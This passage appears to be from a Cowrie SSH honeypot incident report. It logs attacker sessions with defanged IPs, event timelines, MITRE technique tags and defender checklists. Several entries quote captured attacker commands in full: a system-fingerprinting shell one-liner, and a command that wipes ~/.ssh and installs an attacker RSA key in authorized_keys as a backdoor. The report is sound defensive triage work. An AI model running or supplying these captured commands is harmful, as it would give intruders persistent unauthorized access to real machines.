- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f354782a2c69

| Field | Detail |
|---|---|
| **Source IP** | `116.99.172[.]197` |
| **First Seen** | 2026-07-25 09:45 |
| **Last Seen** | 2026-07-25 09:46 |
| **Session Duration** | 88s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:45:24` | `cowrie.session.connect` |
| `2026-07-25 09:45:24` | `cowrie.client.version` |
| `2026-07-25 09:45:24` | `cowrie.client.kex` |
| `2026-07-25 09:45:44` | `cowrie.login.success` |
| `2026-07-25 09:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.172[.]197` to AbuseIPDB if not already reported
- [ ] Block `116.99.172[.]197` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ff170a5dc4a

| Field | Detail |
|---|---|
| **Source IP** | `64.72.74[.]162` |
| **First Seen** | 2026-07-25 09:46 |
| **Last Seen** | 2026-07-25 09:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:46:26` | `cowrie.session.connect` |
| `2026-07-25 09:46:27` | `cowrie.client.version` |
| `2026-07-25 09:46:27` | `cowrie.client.kex` |
| `2026-07-25 09:46:28` | `cowrie.login.success` |
| `2026-07-25 09:46:28` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.72.74[.]162` to AbuseIPDB if not already reported
- [ ] Block `64.72.74[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ffebb738eaf

| Field | Detail |
|---|---|
| **Source IP** | `60.172.54[.]36` |
| **First Seen** | 2026-07-25 09:46 |
| **Last Seen** | 2026-07-25 09:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:46:34` | `cowrie.session.connect` |
| `2026-07-25 09:46:35` | `cowrie.client.version` |
| `2026-07-25 09:46:35` | `cowrie.client.kex` |
| `2026-07-25 09:46:38` | `cowrie.login.success` |
| `2026-07-25 09:46:39` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `60.172.54[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e6f86df1639

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:46 |
| **Last Seen** | 2026-07-25 09:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:46:35` | `cowrie.session.connect` |
| `2026-07-25 09:46:35` | `cowrie.client.version` |
| `2026-07-25 09:46:35` | `cowrie.client.kex` |
| `2026-07-25 09:46:36` | `cowrie.login.success` |
| `2026-07-25 09:46:37` | `cowrie.session.params` |
| `2026-07-25 09:46:37` | `cowrie.command.input` |
| `2026-07-25 09:46:37` | `cowrie.command.input` |
| `2026-07-25 09:46:37` | `cowrie.command.input` |
| `2026-07-25 09:46:37` | `cowrie.command.input` |
| `2026-07-25 09:46:37` | `cowrie.command.input` |
| `2026-07-25 09:46:37` | `cowrie.command.success` |
| `2026-07-25 09:46:37` | `cowrie.command.input` |
| `2026-07-25 09:46:37` | `cowrie.command.input` |
| `2026-07-25 09:46:37` | `cowrie.command.input` |
| `2026-07-25 09:46:37` | `cowrie.command.input` |
| `2026-07-25 09:46:38` | `cowrie.log.closed` |
| `2026-07-25 09:46:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8f57ed7a36f

| Field | Detail |
|---|---|
| **Source IP** | `186.10.86[.]130` |
| **First Seen** | 2026-07-25 09:47 |
| **Last Seen** | 2026-07-25 09:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:47:03` | `cowrie.session.connect` |
| `2026-07-25 09:47:03` | `cowrie.client.version` |
| `2026-07-25 09:47:03` | `cowrie.client.kex` |
| `2026-07-25 09:47:04` | `cowrie.login.success` |
| `2026-07-25 09:47:05` | `cowrie.session.params` |
| `2026-07-25 09:47:05` | `cowrie.command.input` |
| `2026-07-25 09:47:05` | `cowrie.command.failed` |
| `2026-07-25 09:47:05` | `cowrie.log.closed` |
| `2026-07-25 09:47:06` | `cowrie.session.params` |
| `2026-07-25 09:47:06` | `cowrie.command.input` |
| `2026-07-25 09:47:06` | `cowrie.session.file_download` |
| `2026-07-25 09:47:06` | `cowrie.log.closed` |
| `2026-07-25 09:47:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.10.86[.]130` to AbuseIPDB if not already reported
- [ ] Block `186.10.86[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36bb0daf3c09

| Field | Detail |
|---|---|
| **Source IP** | `186.10.86[.]130` |
| **First Seen** | 2026-07-25 09:47 |
| **Last Seen** | 2026-07-25 09:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:47:06` | `cowrie.session.connect` |
| `2026-07-25 09:47:06` | `cowrie.client.version` |
| `2026-07-25 09:47:06` | `cowrie.client.kex` |
| `2026-07-25 09:47:07` | `cowrie.login.success` |
| `2026-07-25 09:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.10.86[.]130` to AbuseIPDB if not already reported
- [ ] Block `186.10.86[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab72be8e57ae

| Field | Detail |
|---|---|
| **Source IP** | `186.10.86[.]130` |
| **First Seen** | 2026-07-25 09:47 |
| **Last Seen** | 2026-07-25 09:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:47:07` | `cowrie.session.connect` |
| `2026-07-25 09:47:07` | `cowrie.client.version` |
| `2026-07-25 09:47:07` | `cowrie.client.kex` |
| `2026-07-25 09:47:08` | `cowrie.login.success` |
| `2026-07-25 09:47:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.10.86[.]130` to AbuseIPDB if not already reported
- [ ] Block `186.10.86[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8050149cf4d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:48 |
| **Last Seen** | 2026-07-25 09:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:48:35` | `cowrie.session.connect` |
| `2026-07-25 09:48:35` | `cowrie.client.version` |
| `2026-07-25 09:48:35` | `cowrie.client.kex` |
| `2026-07-25 09:48:36` | `cowrie.login.success` |
| `2026-07-25 09:48:37` | `cowrie.session.params` |
| `2026-07-25 09:48:37` | `cowrie.command.input` |
| `2026-07-25 09:48:37` | `cowrie.command.input` |
| `2026-07-25 09:48:37` | `cowrie.command.input` |
| `2026-07-25 09:48:37` | `cowrie.command.input` |
| `2026-07-25 09:48:37` | `cowrie.command.input` |
| `2026-07-25 09:48:37` | `cowrie.command.success` |
| `2026-07-25 09:48:37` | `cowrie.command.input` |
| `2026-07-25 09:48:37` | `cowrie.command.input` |
| `2026-07-25 09:48:37` | `cowrie.command.input` |
| `2026-07-25 09:48:37` | `cowrie.command.input` |
| `2026-07-25 09:48:38` | `cowrie.log.closed` |
| `2026-07-25 09:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38907a804dd0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:50 |
| **Last Seen** | 2026-07-25 09:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:50:41` | `cowrie.session.connect` |
| `2026-07-25 09:50:41` | `cowrie.client.version` |
| `2026-07-25 09:50:41` | `cowrie.client.kex` |
| `2026-07-25 09:50:42` | `cowrie.login.success` |
| `2026-07-25 09:50:43` | `cowrie.session.params` |
| `2026-07-25 09:50:43` | `cowrie.command.input` |
| `2026-07-25 09:50:43` | `cowrie.command.input` |
| `2026-07-25 09:50:43` | `cowrie.command.input` |
| `2026-07-25 09:50:43` | `cowrie.command.input` |
| `2026-07-25 09:50:43` | `cowrie.command.input` |
| `2026-07-25 09:50:43` | `cowrie.command.success` |
| `2026-07-25 09:50:43` | `cowrie.command.input` |
| `2026-07-25 09:50:43` | `cowrie.command.input` |
| `2026-07-25 09:50:43` | `cowrie.command.input` |
| `2026-07-25 09:50:43` | `cowrie.command.input` |
| `2026-07-25 09:50:44` | `cowrie.log.closed` |
| `2026-07-25 09:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d59da06342b

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 09:50 |
| **Last Seen** | 2026-07-25 09:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:50:57` | `cowrie.session.connect` |
| `2026-07-25 09:50:57` | `cowrie.client.version` |
| `2026-07-25 09:50:57` | `cowrie.client.kex` |
| `2026-07-25 09:50:59` | `cowrie.login.success` |
| `2026-07-25 09:51:00` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:51:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 09:51:04` | `cowrie.direct-tcpip.data` |
| `2026-07-25 09:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20ffd3f5b3ad

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-07-25 09:52 |
| **Last Seen** | 2026-07-25 09:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:52:12` | `cowrie.session.connect` |
| `2026-07-25 09:52:12` | `cowrie.client.version` |
| `2026-07-25 09:52:12` | `cowrie.client.kex` |
| `2026-07-25 09:52:13` | `cowrie.login.success` |
| `2026-07-25 09:52:14` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b147876db57d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:52 |
| **Last Seen** | 2026-07-25 09:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:52:45` | `cowrie.session.connect` |
| `2026-07-25 09:52:45` | `cowrie.client.version` |
| `2026-07-25 09:52:45` | `cowrie.client.kex` |
| `2026-07-25 09:52:46` | `cowrie.login.success` |
| `2026-07-25 09:52:47` | `cowrie.session.params` |
| `2026-07-25 09:52:47` | `cowrie.command.input` |
| `2026-07-25 09:52:47` | `cowrie.command.input` |
| `2026-07-25 09:52:47` | `cowrie.command.input` |
| `2026-07-25 09:52:47` | `cowrie.command.input` |
| `2026-07-25 09:52:47` | `cowrie.command.input` |
| `2026-07-25 09:52:47` | `cowrie.command.success` |
| `2026-07-25 09:52:47` | `cowrie.command.input` |
| `2026-07-25 09:52:47` | `cowrie.command.input` |
| `2026-07-25 09:52:47` | `cowrie.command.input` |
| `2026-07-25 09:52:47` | `cowrie.command.input` |
| `2026-07-25 09:52:48` | `cowrie.log.closed` |
| `2026-07-25 09:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4700e14f021d

| Field | Detail |
|---|---|
| **Source IP** | `103.20.97[.]75` |
| **First Seen** | 2026-07-25 09:53 |
| **Last Seen** | 2026-07-25 09:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:53:06` | `cowrie.session.connect` |
| `2026-07-25 09:53:06` | `cowrie.client.version` |
| `2026-07-25 09:53:06` | `cowrie.client.kex` |
| `2026-07-25 09:53:07` | `cowrie.login.success` |
| `2026-07-25 09:53:08` | `cowrie.session.params` |
| `2026-07-25 09:53:08` | `cowrie.command.input` |
| `2026-07-25 09:53:08` | `cowrie.command.failed` |
| `2026-07-25 09:53:09` | `cowrie.log.closed` |
| `2026-07-25 09:53:10` | `cowrie.session.params` |
| `2026-07-25 09:53:10` | `cowrie.command.input` |
| `2026-07-25 09:53:10` | `cowrie.session.file_download` |
| `2026-07-25 09:53:10` | `cowrie.log.closed` |
| `2026-07-25 09:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.97[.]75` to AbuseIPDB if not already reported
- [ ] Block `103.20.97[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d03c4b0befa

| Field | Detail |
|---|---|
| **Source IP** | `103.20.97[.]75` |
| **First Seen** | 2026-07-25 09:53 |
| **Last Seen** | 2026-07-25 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:53:10` | `cowrie.session.connect` |
| `2026-07-25 09:53:10` | `cowrie.client.version` |
| `2026-07-25 09:53:11` | `cowrie.client.kex` |
| `2026-07-25 09:53:12` | `cowrie.login.success` |
| `2026-07-25 09:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.97[.]75` to AbuseIPDB if not already reported
- [ ] Block `103.20.97[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b20c9cffa3b5

| Field | Detail |
|---|---|
| **Source IP** | `103.20.97[.]75` |
| **First Seen** | 2026-07-25 09:53 |
| **Last Seen** | 2026-07-25 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:53:12` | `cowrie.session.connect` |
| `2026-07-25 09:53:12` | `cowrie.client.version` |
| `2026-07-25 09:53:12` | `cowrie.client.kex` |
| `2026-07-25 09:53:13` | `cowrie.login.success` |
| `2026-07-25 09:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.97[.]75` to AbuseIPDB if not already reported
- [ ] Block `103.20.97[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d0e99d2fa3b

| Field | Detail |
|---|---|
| **Source IP** | `40.117.97[.]0` |
| **First Seen** | 2026-07-25 09:53 |
| **Last Seen** | 2026-07-25 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:53:34` | `cowrie.session.connect` |
| `2026-07-25 09:53:34` | `cowrie.client.version` |
| `2026-07-25 09:53:34` | `cowrie.client.kex` |
| `2026-07-25 09:53:34` | `cowrie.login.success` |
| `2026-07-25 09:53:35` | `cowrie.session.params` |
| `2026-07-25 09:53:35` | `cowrie.command.input` |
| `2026-07-25 09:53:35` | `cowrie.command.failed` |
| `2026-07-25 09:53:35` | `cowrie.log.closed` |
| `2026-07-25 09:53:36` | `cowrie.session.params` |
| `2026-07-25 09:53:36` | `cowrie.command.input` |
| `2026-07-25 09:53:36` | `cowrie.session.file_download` |
| `2026-07-25 09:53:36` | `cowrie.log.closed` |
| `2026-07-25 09:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.117.97[.]0` to AbuseIPDB if not already reported
- [ ] Block `40.117.97[.]0` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b088a53e02a6

| Field | Detail |
|---|---|
| **Source IP** | `40.117.97[.]0` |
| **First Seen** | 2026-07-25 09:53 |
| **Last Seen** | 2026-07-25 09:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:53:36` | `cowrie.session.connect` |
| `2026-07-25 09:53:36` | `cowrie.client.version` |
| `2026-07-25 09:53:36` | `cowrie.client.kex` |
| `2026-07-25 09:53:36` | `cowrie.login.success` |
| `2026-07-25 09:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.117.97[.]0` to AbuseIPDB if not already reported
- [ ] Block `40.117.97[.]0` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f9ed56d487

| Field | Detail |
|---|---|
| **Source IP** | `40.117.97[.]0` |
| **First Seen** | 2026-07-25 09:53 |
| **Last Seen** | 2026-07-25 09:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:53:36` | `cowrie.session.connect` |
| `2026-07-25 09:53:36` | `cowrie.client.version` |
| `2026-07-25 09:53:36` | `cowrie.client.kex` |
| `2026-07-25 09:53:36` | `cowrie.login.success` |
| `2026-07-25 09:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.117.97[.]0` to AbuseIPDB if not already reported
- [ ] Block `40.117.97[.]0` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a13a86eba71

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 09:53 |
| **Last Seen** | 2026-07-25 09:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:53:48` | `cowrie.session.connect` |
| `2026-07-25 09:53:48` | `cowrie.client.version` |
| `2026-07-25 09:53:48` | `cowrie.client.kex` |
| `2026-07-25 09:53:54` | `cowrie.login.success` |
| `2026-07-25 09:53:54` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:53:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 09:53:55` | `cowrie.direct-tcpip.data` |
